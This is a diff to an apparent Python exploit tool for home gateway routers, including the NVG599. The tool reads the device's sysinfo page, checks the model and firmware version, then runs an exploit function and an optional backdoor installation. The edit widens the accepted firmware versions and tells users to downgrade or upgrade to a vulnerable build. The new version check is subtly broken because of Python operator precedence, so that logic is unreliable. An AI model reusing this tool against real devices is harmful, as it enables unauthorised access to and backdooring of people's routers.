@@ -60,7 +60,7 @@ def start():
     url = "http://" + DEVICE_ADDR + "/cgi-bin/sysinfo.ha"
     response = requests.get(url)
     parsed_html = BeautifulSoup(response.content, features="lxml")
-    info_table = parsed_html.find("table", attrs={"class": "table75"})
+    info_table = parsed_html.find("table")
 
     # collect table of info
     rows = list()
@@ -89,9 +89,9 @@ def start():
             exploit(args.access_code)
             extractfiles(args.install_backdoor, directory)
     elif model_number.find("NVG599") != -1:
-        if ver_string.find("9.2.2h0d83") == -1:
+        if ver_string.find("9.2.2h0d83") == -1 & ver_string.find("9.2.2h0d79") == -1:
             print("Incorrect software version")
-            print("Downgrade NVG599 to 9.2.2h0d83 and come back")
+            print("Downgrade NVG599 to 9.2.2h0d83, or upgrade to 9.2.2h0d79 and come back")
             sys.exit(0)
         else:
             exploit(args.access_code)
